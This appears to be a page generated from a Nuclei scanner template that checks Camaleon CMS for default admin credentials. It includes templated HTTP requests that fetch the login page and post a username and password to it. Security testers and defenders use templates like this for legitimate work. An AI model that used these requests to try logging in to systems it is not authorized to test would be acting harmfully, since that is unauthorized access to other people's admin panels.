# Nuclei Template: Camaleon CMS - Default Login
**Template ID:** camaleon-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`camaleon-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Camaleon CMS default login credentials was discovered.

## Steps to reproduce / Exploit Payload
```http
GET /admin/login HTTP/1.1
Host: {{Hostname}}

POST /admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

authenticity_token={{nonce}}&user%5Busername%5D={{username}}&user%5Bpassword%5D={{password}}
```

